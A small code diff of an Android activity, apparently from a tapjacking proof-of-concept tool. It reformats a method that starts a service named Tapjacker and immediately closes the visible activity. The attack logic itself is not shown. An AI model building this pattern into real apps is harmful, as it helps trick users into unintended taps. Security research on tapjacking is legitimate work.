@@ -20,10 +20,11 @@ import android.os.Bundle;
 
 public class Jackalope extends Activity {
   @Override
-  public void onCreate(Bundle savedInstanceState) {
-    super.onCreate(savedInstanceState);
-    
-    startService(new Intent(this, Tapjacker.class));
-    finish();
-  }
+	public void onCreate(Bundle savedInstanceState)
+	{
+		super.onCreate(savedInstanceState);
+
+		startService(new Intent(this, Tapjacker.class));
+		finish();
+	}
 }
